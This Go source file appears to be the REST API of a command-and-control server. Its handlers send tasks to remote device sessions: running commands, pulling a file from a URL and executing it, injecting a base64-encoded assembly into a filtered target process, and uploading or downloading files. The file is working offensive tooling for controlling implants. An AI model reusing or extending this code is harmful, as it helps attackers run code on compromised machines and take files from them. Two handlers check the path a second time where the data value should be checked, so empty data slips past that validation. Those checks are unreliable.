package rest

import (
	"context"
	"encoding/base64"
	"net/http"

	"github.com/PurpleSec/routex"
	"github.com/PurpleSec/routex/val"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/task"
)

var (
	valTasklet = val.Set{
		val.Validator{Name: "wait", Type: val.Bool, Optional: true},
		val.Validator{Name: "hide", Type: val.Bool, Optional: true},
		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "filter", Type: val.Object, Optional: true, Rules: val.Rules{
			val.SubSet{
				val.Validator{Name: "pid", Type: val.Int, Optional: true},
				val.Validator{Name: "session", Type: val.Bool, Optional: true},
				val.Validator{Name: "fallback", Type: val.Bool, Optional: true},
				val.Validator{Name: "elevated", Type: val.Bool, Optional: true},
				val.Validator{Name: "exclude", Type: val.ListString, Optional: true},
				val.Validator{Name: "include", Type: val.ListString, Optional: true},
			},
		}},
	}
	valUpload = val.Set{
		val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valDownload = val.Set{val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}}}
)

func (s *Server) httpTaskCmdPut(_ context.Context, w http.ResponseWriter, r *routex.Request, v interface{}) {
	t, ok := v.(*tasklet)
	if v == nil || t == nil || !ok {
		errors(http.StatusBadRequest, "invalid tasklet data", w, r)
		return
	}
	if len(t.Data) == 0 {
		errors(http.StatusBadRequest, "empty tasklet data", w, r)
		return
	}
	x := s.cache.device(r.Values.StringDefault("session", ""))
	if x == nil {
		errors(http.StatusNotFound, "", w, r)
		return
	}
	var (
		j   *c2.Job
		err error
	)
	if t.Data[0] == '!' {
		j, err = taskCmd(x, t.Data[1:])
	} else {
		j, err = taskExec(x, t)
	}
	if err != nil {
		errors(http.StatusInternalServerError, err.Error(), w, r)
		return
	}
	if j == nil {
		w.WriteHeader(http.StatusOK)
		return
	}
	s.cache.track(x.ID, j)
	routex.JSON(w, http.StatusCreated, j)
}
func (s *Server) httpTaskPullPut(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	p, _ := c.String("path")
	if len(p) == 0 {
		errors(http.StatusBadRequest, "empty upload path", w, r)
		return
	}
	u, _ := c.String("data")
	if len(p) == 0 {
		errors(http.StatusBadRequest, "empty file destination", w, r)
		return
	}
	x := s.cache.device(r.Values.StringDefault("session", ""))
	if x == nil {
		errors(http.StatusNotFound, "", w, r)
		return
	}
	j, err := x.Task(task.Pull(u, p))
	if err != nil {
		errors(http.StatusInternalServerError, err.Error(), w, r)
		return
	}
	s.cache.track(x.ID, j)
	routex.JSON(w, http.StatusCreated, j)
}
func (s *Server) httpTaskAssemblyPut(_ context.Context, w http.ResponseWriter, r *routex.Request, v interface{}) {
	t, ok := v.(*tasklet)
	if v == nil || t == nil || !ok {
		errors(http.StatusBadRequest, "invalid tasklet data", w, r)
		return
	}
	if len(t.Data) == 0 {
		errors(http.StatusBadRequest, "empty tasklet data", w, r)
		return
	}
	if t.Filter == nil {
		errors(http.StatusBadRequest, "refusing to inject assembly into self", w, r)
		return
	}
	x := s.cache.device(r.Values.StringDefault("session", ""))
	if x == nil {
		errors(http.StatusNotFound, "", w, r)
		return
	}
	b, err := base64.StdEncoding.DecodeString(t.Data)
	if err != nil {
		errors(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	j, err := x.Task(task.InjectEx(&task.Assembly{Data: b, Filter: t.Filter}))
	if err != nil {
		errors(http.StatusInternalServerError, err.Error(), w, r)
		return
	}
	s.cache.track(x.ID, j)
	routex.JSON(w, http.StatusCreated, j)
}
func (s *Server) httpTaskPullExecPut(_ context.Context, w http.ResponseWriter, r *routex.Request, v interface{}) {
	t, ok := v.(*tasklet)
	if v == nil || t == nil || !ok {
		errors(http.StatusBadRequest, "invalid tasklet data", w, r)
		return
	}
	if len(t.Data) == 0 {
		errors(http.StatusBadRequest, "empty tasklet data", w, r)
		return
	}
	x := s.cache.device(r.Values.StringDefault("session", ""))
	if x == nil {
		errors(http.StatusNotFound, "", w, r)
		return
	}
	j, err := x.Task(task.PullExecEx(t.Data, t.Filter, t.Wait != 1))
	if err != nil {
		errors(http.StatusInternalServerError, err.Error(), w, r)
		return
	}
	if j == nil {
		w.WriteHeader(http.StatusOK)
		return
	}
	s.cache.track(x.ID, j)
	routex.JSON(w, http.StatusCreated, j)
}
func (s *Server) httpTaskUploadPut(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	p, _ := c.String("path")
	if len(p) == 0 {
		errors(http.StatusBadRequest, "empty upload path", w, r)
		return
	}
	d, _ := c.String("data")
	if len(p) == 0 {
		errors(http.StatusBadRequest, "empty file data", w, r)
		return
	}
	b, err := base64.StdEncoding.DecodeString(d)
	if err != nil {
		errors(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	x := s.cache.device(r.Values.StringDefault("session", ""))
	if x == nil {
		errors(http.StatusNotFound, "", w, r)
		return
	}
	j, err := x.Task(task.Upload(p, b))
	if err != nil {
		errors(http.StatusInternalServerError, err.Error(), w, r)
		return
	}
	s.cache.track(x.ID, j)
	routex.JSON(w, http.StatusCreated, j)
}
func (s *Server) httpTaskDownloadPut(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	p, _ := c.String("path")
	if len(p) == 0 {
		errors(http.StatusBadRequest, "empty upload path", w, r)
		return
	}
	x := s.cache.device(r.Values.StringDefault("session", ""))
	if x == nil {
		errors(http.StatusNotFound, "", w, r)
		return
	}
	j, err := x.Task(task.Download(p))
	if err != nil {
		errors(http.StatusInternalServerError, err.Error(), w, r)
		return
	}
	s.cache.track(x.ID, j)
	routex.JSON(w, http.StatusCreated, j)
}
